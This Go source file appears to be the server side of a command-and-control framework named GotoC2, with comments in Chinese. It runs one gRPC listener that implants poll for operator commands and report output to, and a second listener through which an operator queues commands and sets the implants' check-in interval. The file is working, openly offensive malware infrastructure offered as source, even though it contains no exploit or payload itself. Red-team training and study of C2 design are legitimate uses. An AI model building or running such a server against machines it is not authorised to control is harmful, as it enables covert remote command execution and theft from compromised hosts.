package main

import (
	"GotoC2/grpcapi"
	"GotoC2/util"
	"context"
	"errors"
	"flag"
	"fmt"
	"google.golang.org/grpc"
	"log"
	"net"
)

var sleepTime int32 = 3

type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

// 构造函数，用于创建并返回一个 implantServer 类型的实例。它接受两个参数 work 和 output，这两个参数分别是类型为 chan *grpcapi.Command 的通道
func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	// 使用 select 语句来监听 s.work 通道，并从中接收命令。如果通道中有值可被接收，则将其赋值给 cmd 并返回，同时返回 nil 作为错误
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	fmt.Println("result:" + result.In + result.Out)
	return &grpcapi.Empty{}, nil
}
func (s *implantServer) GetSleepTime(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.SleepTime, error) {
	time := new(grpcapi.SleepTime)
	time.Time = sleepTime
	return time, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	fmt.Println(cmd.In)
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()

	res = <-s.output

	return res, nil
}

func (s *adminServer) SetSleepTime(ctx context.Context, time *grpcapi.SleepTime) (*grpcapi.Empty, error) {
	sleepTime = time.Time
	return &grpcapi.Empty{}, nil
}

func main() {
	util.Banner()

	var (
		// 创建了两个net.listener类型的变量implantListener和adminListener，以及一个error类型的变量err。它还创建了两个用于通信的通道work和output
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
		implantPort, adminPort         int
	)
	flag.IntVar(&implantPort, "iport", 1961, "Implant server port")
	flag.IntVar(&adminPort, "aport", 1962, "Admin server port")
	flag.Parse()
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	// 植入程序服务端和管理程序服务端使用相同的通道
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	// 服务端建立监听，植入服务端和管理服务端监听的端口分别是1961和1962
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", implantPort)); err != nil {
		log.Fatalln("implantserver" + err.Error())
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", adminPort)); err != nil {
		log.Fatalln("adminserver" + err.Error())
	}
	// 服务端设置允许发送和接受数据的最大限制
	opts = []grpc.ServerOption{
		grpc.MaxRecvMsgSize(1024 * 1024 * 12),
		grpc.MaxSendMsgSize(1024 * 1024 * 12),
	}
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	//使用goroutine启动植入程序服务端，防止代码阻塞，毕竟后面还要开启管理程序服务端
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
